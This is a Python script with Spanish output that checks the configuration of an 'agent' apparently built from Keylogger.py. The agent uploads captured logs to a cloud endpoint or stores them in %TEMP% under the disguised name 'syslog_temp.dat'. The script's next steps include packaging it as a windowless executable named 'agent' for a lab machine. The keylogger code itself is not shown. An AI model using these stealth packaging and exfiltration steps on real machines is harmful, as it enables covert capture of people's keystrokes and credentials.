import os
import sys

from dotenv import load_dotenv

if getattr(sys, "frozen", False):
    directorio_actual = os.path.dirname(sys.executable)
else:
    directorio_actual = os.path.dirname(os.path.abspath(__file__))

ruta_env = os.path.join(directorio_actual, ".env")

print("=" * 60)
print("VERIFICADOR DE CONFIGURACIÓN DEL AGENTE")
print("=" * 60)
print(f"Directorio actual: {directorio_actual}")
print(f"Archivo .env existe: {os.path.exists(ruta_env)}")
print()

load_dotenv(ruta_env)

MODO = os.getenv("MODO", "nube").strip().lower()
API_URL = os.getenv("API_URL", "").rstrip("/")
SHARED_TOKEN = os.getenv("SHARED_TOKEN", "")
AGENT_ID = os.getenv("AGENT_ID", "")

print("=" * 60)
print("CONFIGURACIÓN CARGADA:")
print("=" * 60)
print(f"MODO: {MODO if MODO else '[NO CONFIGURADO]'}")
print(f"API_URL: {API_URL if API_URL else '[NO CONFIGURADO]'}")
print(f"SHARED_TOKEN: {'[CONFIGURADO - ' + SHARED_TOKEN[:8] + '...]' if SHARED_TOKEN else '[NO CONFIGURADO]'}")
print(f"AGENT_ID: {AGENT_ID if AGENT_ID else '[NO CONFIGURADO]'}")
print("=" * 60)
print()

errores = []
if MODO not in ("nube", "local"):
    errores.append("❌ MODO debe ser 'nube' o 'local'")
elif MODO == "nube":
    if not API_URL:
        errores.append("❌ API_URL no configurado (copialo del output ApiEndpoint del stack CloudFormation)")
    if not SHARED_TOKEN:
        errores.append("❌ SHARED_TOKEN no configurado (el mismo secreto que usaste al desplegar el backend)")
if not AGENT_ID:
    errores.append("❌ AGENT_ID no configurado")

if errores:
    print("ERRORES ENCONTRADOS:")
    for error in errores:
        print(f"  {error}")
    print("\nACCIÓN REQUERIDA:")
    print("1. Copia .env.example a .env")
    print("2. Despliega el backend: sigue backend/README.md")
    print("3. Completa API_URL y SHARED_TOKEN con los valores del stack")
else:
    print("✓✓✓ CONFIGURACIÓN CORRECTA ✓✓✓")
    print()
    if MODO == "nube":
        print("Endpoint de subida: " + API_URL + "/url")
    else:
        print("Modo local: los logs se guardan en %TEMP%\\" + os.getenv("LOG_FILENAME", "syslog_temp.dat"))

    print("\nSIGUIENTES PASOS:")
    print("  1. pip install -r requirements.txt")
    print("  2. python Keylogger.py          (pruebas)")
    print("  3. pyinstaller --onefile --noconsole --name=agent Keylogger.py")
    print("     Copia el .env junto al .exe en la máquina de laboratorio.")
    print("     NUNCA empaques el .env dentro del ejecutable ni lo distribuyas con él.")

input("\nPresiona Enter para salir...")
